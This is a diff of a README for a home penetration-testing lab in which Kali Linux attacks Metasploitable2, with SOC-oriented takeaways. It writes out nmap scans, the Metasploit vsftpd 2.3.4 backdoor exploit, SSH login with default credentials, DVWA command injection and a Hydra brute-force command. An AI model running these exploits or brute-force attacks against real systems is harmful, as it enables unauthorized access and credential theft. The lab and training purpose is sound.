@@ -1,32 +1,47 @@
-# kali-metasploitable-lab
-Penetration testing sim using Kali Linux and Metasploitable2
-
 # Kali Linux & Metasploitable2: Penetration Testing Lab
 
 This project simulates an internal network attack scenario using Kali Linux (attacker) and Metasploitable2 (target). It demonstrates core reconnaissance, exploitation, and post-exploitation techniques aligned with SOC Analyst learning objectives.
 
 ---
 
-## Lab Setup
+## 📋 Table of Contents
 
-| Component      | Details                        |
-|----------------|--------------------------------|
-| Attacker       | Kali Linux (UTM VM)            |
-| Target         | Metasploitable2 (UTM VM)       |
-| Network        | Shared NAT / Bridged           |
-| Connectivity   | Confirmed via ping             |
+- [Lab Setup](#lab-setup)
+- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
+  - [Basic Nmap Scan](#basic-nmap-scan)
+  - [Service Version Detection](#service-version-detection)
+  - [Vulnerability Detection](#vulnerability-detection)
+- [Phase 2: Exploitation](#phase-2-exploitation)
+  - [FTP Exploit – vsftpd 2.3.4 Backdoor](#ftp-exploit--vsftpd-234-backdoor)
+  - [SSH Exploit](#ssh-exploit)
+  - [HTTP Exploit – DVWA Command Injection](#http-exploit--dvwa-command-injection)
+  - [HTTP Brute-Force Attack – DVWA Login](#http-brute-force-attack--dvwa-login)
 
 ---
 
-## Phase 1: Reconnaissance
+## 🛠️ Lab Setup
+
+| Component    | Details                  |
+|--------------|--------------------------|
+| Attacker     | Kali Linux (UTM VM)      |
+| Target       | Metasploitable2 (UTM VM) |
+| Network Mode | Shared NAT / Bridged     |
+| Connectivity | Confirmed via ping       |
+
+---
+
+## 🔎 Phase 1: Reconnaissance
 
 ### Target IP: `192.168.64.3`
 
-#### Basic Nmap Scan
+---
+
+### 🔍 Basic Nmap Scan
+
 ```bash
 nmap -sS -T4 192.168.64.3 -oN basic-scan.txt
 ```
-Summary of Open Ports:
+**Summary of Open Ports:**
 - 21 (FTP)
 - 22 (SSH)
 - 80 (HTTP)
@@ -44,7 +59,7 @@ Summary:
 ```bash
 nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt
 ```
-Summary: 
+**Summary:** 
 - Port 21 (FTP) - VULNERABLE to vsftpd 2.3.4 backdoor (CVE-2011-2523)
 - Port 80 (HTTP) - Apache version outdated with multiple CVEs
 
@@ -53,19 +68,18 @@ Summary:
 
 ## Phase 2: Exploitation
 
-### Exploit: vsftpd 2.3.4 Backdoor (CVE-2011-2523)
+### FTP Exploit - vsftpd 2.3.4 Backdoor (CVE-2011-2523)
 
 #### Tool Used: Metasploit Framework
-
 ```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST 192.168.64.3
 exploit
 ```
 
-Result: 
+**Result:** 
 * Successful shell access as `root`
-* Verified with ```whoami```
+* Verified with `whoami`
 
 
 ---
@@ -74,18 +88,16 @@ Result:
 
 **Target IP:** 192.168.64.3  
 **Tool Used:** Native OpenSSH Client
-
-**Login Attempt:**
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3
 ```
 
-Result: 
+**Result:** 
 * Successful login using default credentials:
   * Username: `msfadmin`
   * Password: `msfadmin`
 * Access confirmed with:
-  ```whoami```
+  `whoami`
 
 #### Compatibility Issue: Legacy SSH Key Algorithms
 
@@ -95,15 +107,15 @@ Result:
 **Solution**
 ```ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3```
 
-Lessons Learned:
-Modern SSH clients disable insecure key types by default. In these lab scenarios with outdated systems compatibility flags may be required to access vulnerable targets. SOC teams should monitor for these depreciated cryptographic negotiations as potential attack indicators.
+**Lessons Learned:**
+Modern SSH clients disable depreciate algorithms by default. Lab environments often require these legacy options to connect. SOC teams should watch for deprecated algorithm negotiation in logs as potential indicators of legacy or malicious activity.
 
 
 ---
 
-### HTTP Exploit – DVWA Command Injection (Port 80)
+### HTTP Exploit – DVWA Command Injection
 
-**Target URL:** http://192.168.64.3/dvwa/vulnerabilities/exec/  
+**Target URL:** `http://192.168.64.3/dvwa/vulnerabilities/exec/`
 **Authentication:**  
 - Username: `admin`  
 - Password: `password`
@@ -124,27 +136,35 @@ Modern SSH clients disable insecure key types by default. In these lab scenarios
 www-data
 ```
 
-Result:
-* Confirmed server responded with user `www-data`
-* Successfully executed  arbitrary command (`whoami`)
+***Result:***
+* Successfully executed `whoami`
+* Proved remote command execution vulnerability
 
 
 ---
 
-###HTTP Brute-Force Attack – DVWA Login Page
+**###HTTP Brute-Force Attack – DVWA Login**
 
-**Target URL:** http://192.168.64.3/dvwa/login.php  
-**Authentication Type:** HTTP POST Form  
+**Target URL:** `http://192.168.64.3/dvwa/login.php` 
+**Login Type:** HTTP POST Form  
 **Tool Used:** Hydra
 
-**Command Used:**
+**Command:**
 ```bash
 hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.64.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
 
-Result: 
+**Result:**
 ```[80][http-post-form] host: 192.168.64.3   login: admin   password: password```
 
-Summary: 
-* Successfully performed a dictionary-based brute-force attack using a common wordlist
-* Login credentials were discovered due to weak password use
+**Summary:** 
+* Performed a dictionary brute-force attack
+* Login credentials were discovered
+* Demonstrated the importance of strong password credential policies
+
+
+**SOC Analyst Takeaways**
+Brute-force activity can be detected via repeated login failures, especially to web apps or SSH
+Exploits often rely on outdated software or weak credentials
+Key log indicators: POST attempts to login pages, multiple SSH attempts, legacy crypto negotiations
+Defenses: Rate limiting, MFA, updated services, IDS/IPS, log monitoring
